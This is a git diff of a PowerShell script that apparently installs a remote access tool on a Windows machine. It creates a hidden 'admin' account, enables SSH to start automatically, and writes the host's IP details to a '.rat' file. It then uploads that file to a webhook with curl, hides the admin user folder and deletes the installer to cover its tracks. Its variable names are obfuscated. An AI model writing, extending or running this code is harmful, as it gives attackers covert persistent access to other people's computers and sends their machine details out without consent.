@@ -20,6 +20,8 @@ function geIwCZloBx {
     }
 }
 
+$location = pwd
+
 # make admin
 $sqbXFdLvyw = "admin" 
 $DCilJFugpP = RpLGWiUsIy
@@ -38,7 +40,7 @@ Start-Service sshd
 Set-Service -Name sshd -StartupType 'Automatic'
 
 # rat file
-$CRYnrkaDbe = "$env:UserName.txt"
+$CRYnrkaDbe = "$env:UserName.rat"
 $AhdjktGyiZ = (Get-NetIPConfiguration | Where-Object { $_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected"}).IPv4Address.IPAddress
 
 New-Item -Path $CRYnrkaDbe -Force
@@ -53,10 +55,16 @@ Add-Content -Path $CRYnrkaDbe -Value 'local' -Force # connection type
 
 # send file to webhook
 $link = ""
-Invoke-Expression "curl.exe -F `"payload_json={\```"username\```": \```"admin\```", \```"content\```": \```"download me\```"}`" -F ```"file=@$env:username.txt```" $link"
+Invoke-Expression "curl.exe -F `"payload_json={\```"username\```": \```"admin\```", \```"content\```": \```"download me\```"}`" -F ```"file=@$env:username.rat```" $link"
+
+#create payloads folder
+Set-Location $env:temp 
+mkdir happy
+mkdir sad
 
 # cleanup
 attrib +h +s +r C:/Users/admin
+Set-Location $location
 Remove-Item $CRYnrkaDbe -Force
 Remove-Item install.ps1 -Force
 
